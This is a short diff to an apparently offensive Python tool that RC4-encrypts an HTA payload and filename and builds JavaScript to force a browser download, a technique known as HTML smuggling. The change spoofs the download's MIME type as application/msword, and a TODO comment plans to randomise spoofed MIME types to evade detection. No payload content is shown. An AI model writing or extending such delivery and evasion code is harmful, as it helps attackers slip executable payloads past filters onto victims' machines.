@@ -126,8 +126,9 @@ if __name__ == '__main__':
 		hta_encrypted = base64.b64encode(rc4(args.key, hta_text))
 		filename_encrypted = base64.b64encode(rc4(args.key, args.output))
 		# blobShim borrowed from https://github.com/mholt/PapaParse/issues/175#issuecomment-75597039
-		blobShim = """(function(blob,fname){if(window.navigator.msSaveOrOpenBlob)
-window.navigator.msSaveBlob(blob,fname);else{var a=window.document.createElement("a");a.href=window.URL.createObjectURL(blob,{type:"text/plain"});a.download=fname;document.body.appendChild(a);a.click();document.body.removeChild(a)}})
+		# TODO: Spoof other mime-types, maybe pick at random from a list of suitable candidates?
+		blobShim = """(function(b,fname){if(window.navigator.msSaveOrOpenBlob)
+window.navigator.msSaveBlob(b,fname);else{var f = new File([b], fname, {type:"application/msword"});var a=window.document.createElement("a");a.href=window.URL.createObjectURL(f);a.download=fname;document.body.appendChild(a);a.click();document.body.removeChild(a)}})
 """
 
 		msSaveBlob = base64.b64encode(rc4(args.key, blobShim))
